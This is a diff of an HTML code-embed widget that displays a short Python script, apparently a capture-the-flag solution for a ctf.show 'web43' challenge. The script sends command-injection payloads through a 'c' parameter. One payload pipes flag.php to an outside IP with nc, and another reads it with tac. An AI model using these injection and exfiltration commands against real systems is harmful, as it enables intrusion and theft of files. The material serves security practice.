@@ -1,5 +1,33 @@
-<div class="code-embed-container">
-	<span class="code-block-flair" aria-label="复制" contenteditable="false">
-	<div class="code-embed-open-btn" aria-label="Open file">
-	<div class="code-embed-wrapper">
+<div class="internal-embed file-embed mod-generic is-loaded code-embed-lp-processed code-embed-widget" tabindex="-1"
+	src="web43.py" alt="web43" contenteditable="false">
+	<div class="code-embed-container">
+		<div class="code-embed-toolbar">
+			<div class="code-embed-open-btn" aria-label="Open file">
+				<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+					stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+					class="svg-icon lucide-external-link">
+					<path d="M15 3h6v6"></path>
+					<path d="M10 14 21 3"></path>
+					<path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+				</svg>
+			</div>
+			<span class="code-block-flair" aria-label="复制" contenteditable="false">python</span>
+		</div>
+		<div class="code-embed-wrapper has-run-code-button">
+			<pre class="language-python">
+				<code class="language-python is-loaded">
+					<span class="token keyword">from</span> requests <span class="token keyword">import</span> get param <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'c'</span><span class="token punctuation">:</span> <span class="token string">"nc 47.104.27.64 9084 &lt; flag.php"</span><span class="token punctuation">}</span> param<span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"tac flag.php &amp;&amp; tac flag.php"</span> URL <span class="token operator">=</span> <span class="token string">"https://57d2575b-197f-4290-bd2b-7ece9c296d27.challenge.ctf.show/"</span> resp <span class="token operator">=</span> get<span class="token punctuation">(</span>url<span class="token operator">=</span>URL<span class="token punctuation">,</span> params<span class="token operator">=</span>param<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+					<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Status code:'</span><span class="token punctuation">,</span> resp<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
+					<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+				</code>
+				</code>
+				<button class="copy-code-button">
+					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy">
+						<rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect>
+						<path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+					</svg>
+				</button>
+				<button class="run-code-button">Run</button></pre>
+		</div>
+	</div>
 </div>
